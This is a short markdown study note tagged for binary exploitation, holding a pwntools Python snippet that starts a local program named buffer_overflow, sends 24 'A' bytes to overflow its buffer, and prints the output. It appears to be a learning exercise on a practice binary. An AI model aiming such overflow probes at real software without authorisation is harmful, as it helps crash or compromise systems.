---
tags:
  - python
  - security
  - binary_exploitation
---
```python
import pwn 
r = pwn.process("./buffer_overflow")
r.send(b"A"*24)
print(r.readall())
```